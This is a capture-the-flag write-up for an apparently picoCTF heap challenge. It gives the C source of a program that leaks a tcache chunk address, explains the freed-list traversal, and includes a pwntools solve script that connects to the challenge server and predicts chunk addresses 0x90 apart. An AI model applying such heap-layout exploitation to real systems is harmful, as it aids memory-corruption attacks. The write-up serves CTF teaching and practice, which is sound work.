## Source Code ( Full )

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>

#define CHUNK_COUNT 6
#define CHUNK_SIZE 0x80           
#define FLAG_FILE "flag.txt"
#define FLAG_OFFSET (sizeof(void *))  

static int is_known_chunk(void *p, void *chunks[], int n) {
    for (int i = 0; i < n; ++i) {
        if (chunks[i] == p) return 1;
    }
    return 0;
}
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    void *chunks[CHUNK_COUNT];
    char flag_buf[256] = {0};
    FILE *f = fopen(FLAG_FILE, "r");
    if (!f) {
        fprintf(stderr, "Could not open %s\n", FLAG_FILE);
        return 1;
    }
    if (!fgets(flag_buf, sizeof(flag_buf), f)) {
        fclose(f);
        fprintf(stderr, "Could not read flag from %s\n", FLAG_FILE);
        return 1;
    }
    fclose(f);
  
    size_t flen = strlen(flag_buf);
    if (flen && flag_buf[flen-1] == '\n') {
        flag_buf[flen-1] = '\0';
        flen--;
    }
    if (FLAG_OFFSET + flen >= CHUNK_SIZE) {
        fprintf(stderr, "Flag too large for chunk. Increase CHUNK_SIZE or reduce flag length.\n");
        return 1;
    }
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        chunks[i] = malloc(CHUNK_SIZE);
        if (!chunks[i]) {
            fprintf(stderr, "malloc failed at i=%d\n", i);
            for (int j = 0; j < i; ++j) free(chunks[j]);
            return 1;
        }
        memset(chunks[i], 0, CHUNK_SIZE);
    }
    memcpy((char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET, flag_buf, flen + 1);
    void *head = chunks[0]; 
    printf("tcache head (start of free list) -> %p\n", head);
for (int i = CHUNK_COUNT - 1; i >= 0; --i) {
    free(chunks[i]);
}

    void *expected = head;
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        void *user_addr = NULL;
        printf("Chunk %d address: ", i+1);
        if (scanf("%p", &user_addr) != 1) {
            fprintf(stderr, "Invalid input. Exiting.\n");
            return 1;
        }

        if (user_addr != expected) {
            fprintf(stderr, "Wrong address. Got %p. Exiting.\n", user_addr);
            return 1;
        }

        void *next = NULL;
        memcpy(&next, user_addr, sizeof(void *)); 

        if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT)) {
            fprintf(stderr, "Detected invalid next pointer value %p (not one of allocated chunks). Aborting to avoid crash.\n", next);
            fprintf(stderr, "Dump of first 16 bytes at %p: ", user_addr);
            unsigned char *b = user_addr;
            for (size_t z = 0; z < 16; ++z) {
                fprintf(stderr, "%02x ", b[z]);
            }
            fprintf(stderr, "\n");
            return 1;
        }

        expected = next;
    }
    char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;
    printf("Correct traversal! Flag: %s\n", flag_loc);

    return 0;
}

```

From the full source code above, not all parts are relevant for exploitation. Some sections are only responsible for setup, such as opening `flag.txt`, reading its contents, and handling potential errors.

Below are the key parts of the code that matter for understanding the vulnerability and solving the challenge.

>[!note]- Section 1 — is_known_chunk
>
>```c
>static int is_known_chunk(void *p, void *chunks[], int n) {
>    for (int i = 0; i < n; ++i) {
>        if (chunks[i] == p) return 1;
>    }
>    return 0;
>}
>```
>
>This function simply loops from index **0 to n-1** and checks whether pointer `p` exists inside the `chunks[]` array.
>
>In other words, it verifies whether a pointer is one of the **valid/known chunk addresses**.
>
>Later in the program:
>
>- `user_addr` comes from user input  
>- `next` is read from memory at `user_addr`
>
>```c
>memcpy(&next, user_addr, sizeof(void *));
>```
>
>Then the program checks:
>
>```c
>is_known_chunk(next, chunks, CHUNK_COUNT)
>```
>
>So basically:
>
>- It ensures that `next` is still one of the original allocated chunks  
>- Prevents arbitrary or invalid pointer traversal
>
>This will make more sense once we see how the free list traversal works in the next section.

>[!note]- Section 2 — Flag Placement and Free List Setup
>
>```c
>memcpy((char *)chunks[CHUNK_COUNT - 1] + FLAG_OFFSET, flag_buf, flen + 1);
>void *head = chunks[0];
>printf("tcache head (start of free list) -> %p\n", head);
>
>for (int i = CHUNK_COUNT - 1; i >= 0; --i) {
>    free(chunks[i]);
>}
>```
>
>In this section, the program first places the flag inside the last chunk:
>
>```c
>memcpy((char *)chunks[CHUNK_COUNT - 1] + FLAG_OFFSET, flag_buf, flen + 1);
>```
>
>Here, `FLAG_OFFSET` is already defined above as:
>
>```c
>#define FLAG_OFFSET (sizeof(void *))
>```
>
>Since this is a **64-bit** binary, `sizeof(void *) = 8`, so `FLAG_OFFSET = 8`.
>
>That means the flag is not written at the very start of the chunk. Instead, it is copied starting **8 bytes after the beginning** of the last chunk.
>
>So for example, in `chunks[5]`, the first 8 bytes are left untouched for pointer-related data, and the actual flag is stored right after that.
>
>Next, the program does:
>
>```c
>void *head = chunks[0];
>```
>
>This stores the address of `chunks[0]` into `head`. In other words, `head` is used as the expected starting point of the traversal.
>
>Then it prints that value:
>
>```c
>printf("tcache head (start of free list) -> %p\n", head);
>```
>
>So the program directly leaks the address of `chunks[0]` to stdout.
>
>Finally, all chunks are freed in reverse order:
>
>```c
>for (int i = CHUNK_COUNT - 1; i >= 0; --i) {
>    free(chunks[i]);
>}
>```
>
>This means the chunks are freed from the back to the front, starting from `chunks[5]` down to `chunks[0]`.
>
>Because their size fits the tcache bin, these freed chunks are inserted into the **tcache freelist**. This is important, because once freed, the chunk contents are reused by glibc to store the linked-list pointer for tcache traversal.

> [!note]- Section 3 — Pointer Traversal Logic
> ```c
> void *expected = head;
> for (int i = 0; i < CHUNK_COUNT; ++i) {
>     void *user_addr = NULL;
>     printf("Chunk %d address: ", i+1);
>     if (scanf("%p", &user_addr) != 1) {
>         fprintf(stderr, "Invalid input. Exiting.\n");
>         return 1;
>     }
>
>     if (user_addr != expected) {
>         fprintf(stderr, "Wrong address. Got %p. Exiting.\n", user_addr);
>         return 1;
>     }
>
>     void *next = NULL;
>     memcpy(&next, user_addr, sizeof(void *)); 
>
>     if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT)) {
>         fprintf(stderr, "Detected invalid next pointer value %p (not one of allocated chunks). Aborting to avoid crash.\n", next);
>         fprintf(stderr, "Dump of first 16 bytes at %p: ", user_addr);
>         unsigned char *b = user_addr;
>         for (size_t z = 0; z < 16; ++z) {
>             fprintf(stderr, "%02x ", b[z]);
>         }
>         fprintf(stderr, "\n");
>         return 1;
>     }
>
>     expected = next;
> }
> char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;
> printf("Correct traversal! Flag: %s\n", flag_loc);
> ```
>
> This is the core traversal logic of the challenge.
>
> First, the program initializes:
>
> ```c
> void *expected = head;
> ```
>
> So the first address we must provide is whatever was stored in `head`, which earlier was set to `chunks[0]`.
>
> Inside the loop, the program asks for input using:
>
> ```c
> scanf("%p", &user_addr)
> ```
>
> The `%p` format means it expects a **pointer/address** as input.
>
> After that, it checks:
>
> ```c
> if (user_addr != expected)
> ```
>
> So our input must exactly match the address the program currently expects, otherwise it exits immediately.
>
> Next, the program does:
>
> ```c
> memcpy(&next, user_addr, sizeof(void *));
> ```
>
> Since this is a 64-bit binary, `sizeof(void *) = 8`, so this copies the **first 8 bytes** from memory at `user_addr` into the variable `next`.
>
> In other words, `next` is taken from the first 8 bytes of the chunk pointed to by our input.  
> That is exactly how the program follows the linked-list style pointer chain.
>
> Then it validates that pointer using the helper from Section 1:
>
> ```c
> if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT))
> ```
>
> This means:
>
> - if `next` is not `NULL`
> - it must be one of the original chunk addresses in `chunks[]`
>
> Otherwise the program aborts.
>
> If the check passes, the traversal continues with:
>
> ```c
> expected = next;
> ```
>
> So the next user input must match the pointer that was just read from the current chunk.
>
> This loop runs **6 times**, which matches `CHUNK_COUNT`.
>
> If all 6 inputs are correct, the program finally prints:
>
> ```c
> char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;
> printf("Correct traversal! Flag: %s\n", flag_loc);
> ```
>
> So after successful traversal, it reads the flag from `chunks[CHUNK_COUNT-1] + FLAG_OFFSET`, which is the same flag location that was prepared earlier in the last chunk.

## Solve.py

``` python
from pwn import *

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")

def conn():
    return remote("candy-mountain.picoctf.net", 52825)

def main():
    r = conn()

    r.recvuntil(b"tcache head (start of free list) -> ")
    current_addr = int(r.recvline().strip(), 16)

    OFFSET = 0x90

    for i in range(1, 7):
        r.recvuntil(f"Chunk {i} address: ".encode())
        r.sendline(hex(current_addr).encode())
        current_addr += OFFSET

    r.interactive()

if __name__ == "__main__":
    main()
```

> [!note]- Solver Explanation — Why the Offset is `0x90`
> In the solver, we repeatedly add `0x90` to the current chunk address:
>
> ```python
> OFFSET = 0x90
> current_addr += OFFSET
> ```
>
> The reason comes from how the chunks are allocated in memory.
>
> From the source code:
>
> ```c
> #define CHUNK_SIZE 0x80
> ```
>
> Each chunk requests **`0x80` bytes** of user data.  
> However, on **64-bit glibc**, every heap chunk also has a **16-byte malloc header** placed before the user area.
>
> So the real size of each chunk in memory becomes:
>
> - user data: `0x80`
> - heap header: `0x10`
> - total: **`0x90`**
>
> That means each allocated chunk is spaced **`0x90` bytes apart** in memory.
>
> So if:
>
> - `chunk1` starts at `0x55555575e2a0`
>
> then:
>
> - `chunk2` will be at `0x55555575e330`
>
> because:
>
> ```text
> 0x55555575e2a0 + 0x90 = 0x55555575e330
> ```
>
> And the same pattern continues:
>
> ```text
> chunk1 = 0x55555575e2a0
> chunk2 = 0x55555575e330
> chunk3 = 0x55555575e3c0
> chunk4 = 0x55555575e450
> ...
> ```
>
> A simple visualization looks like this:
>
> ```text
> [ chunk1 header | chunk1 user data ] [ chunk2 header | chunk2 user data ]
> <------ 0x10 --> <------ 0x80 -----> <------ 0x10 --> <------ 0x80 ----->
>
> total size per chunk = 0x90
> ```
>
> Or in terms of addresses:
>
> ```text
> chunk1 user area: 0x...2a0
> chunk2 user area: 0x...330
>                    ^ +0x90
> ```
>
> So in the exploit, once we know the first chunk address leaked by the program, we can keep adding **`0x90`** to predict the addresses of the next chunks correctly.
